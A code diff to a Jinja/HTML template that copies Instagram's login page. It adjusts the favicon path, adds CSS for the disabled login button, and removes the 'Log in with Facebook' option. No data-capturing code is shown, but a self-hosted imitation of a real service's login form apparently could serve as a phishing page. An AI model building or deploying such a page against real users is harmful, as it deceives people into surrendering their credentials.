@@ -6,8 +6,27 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="{{ url_for('static', path='css/styles.css') }}">
     <title>Instagram</title>
-    <link rel="icon" type="image/x-icon" href="favicon.png">
+    <link rel="icon" type="image/x-icon" href="{{ url_for('static', path='images/favicon.png') }}">
     <link href="https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        button {
+            transition: background-color 0.3s ease;
+        }
+
+        button:disabled {
+            background-color: #3a9bcf; /* Darker blue color when disabled */
+            cursor: default; /* Default cursor when disabled */
+        }
+
+        #loginButton {
+            cursor: pointer; /* Normal cursor when hovering */
+        }
+
+        #loginButton:disabled {
+            background-color: #3a9bcf; /* Ensure the background color is set for the disabled state */
+            cursor: default; /* Default cursor when disabled */
+        }
+    </style>
 </head>
 <body class="h-screen overflow-hidden flex items-center justify-center" style="background: white;">
     <div class="h-screen bg-gray-50 flex flex-col justify-center items-center">
@@ -23,22 +42,11 @@
                         id="password" name="password" aria-label="Password" placeholder="Password" type="password">
                     <span class="show-password" id="showPassword">Show</span>
                 </div>
-                <button type="submit" id="loginButton" class="text-sm text-center bg-gray-300 text-white py-1 rounded font-medium transition duration-200 cursor-not-allowed" disabled>
+                <button type="submit" id="loginButton" class="text-sm text-center text-white py-1 rounded font-medium transition duration-200 cursor-not-allowed" disabled>
                     Log In
                 </button>
                 <div id="error-message" class="text-red-500 text-xs mt-2 hidden"></div>
             </form>
-            <div class="flex justify-evenly space-x-2 w-64 mt-4">
-                <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
-                <span class="flex-none uppercase text-xs font-semibold or-txt">or</span>
-                <span class="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
-            </div>
-            <button class="mt-4 flex">
-                <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Foidc%2F%3Fapp_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignupviafb%252F%26response_type%3Dcode%26scope%3Dopenid%2Bemail%2Bprofile%2Blinking%26state%3DATAgIfDKjW9kW1cdZ4xpgpASxLKEoLbPId46QzejdV4Xux-HLQXKZzS2g0A6mhmwrhMtSqatZxghoYNW87zkPO_YskcoAPsUL11VEWgz-Bl1fOO6CWdFZew8UsrjfZAdsWnLxFQck7a2CwedCGOMdkQjY8dLXYt7KQ69XFjUOiZQi37hugpvHmFNBp7TbQgGhpB2HPFyamzl_2xaSiGcghlmCA9Y5HyNMgUT6PRfjENlOmyzDUMVbdMYqKUIW9jokkDgXVsPjqHyp_v0GcLKm1YsNUWEM0mp0NUGO9MmFbZimwpgrvGVbXsTcgl4ECFG" target="_self" style="display: flex; align-items: center; text-decoration: none;">
-                    <img src="{{ url_for('static', path='images/facebook.png') }}" class="facebook-logo" alt="Facebook Logo">
-                    <span class="font-semibold facebook-txt ml-1 hover:text-dark-blue">Log in with Facebook</span>
-                </a>
-            </button>
             <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-pass-txt text-sm mt-4 cursor-pointer -mb-4">Forgot password?</a>
         </div>
         <div class="bg-white border border-gray-300 text-center w-80 py-4">
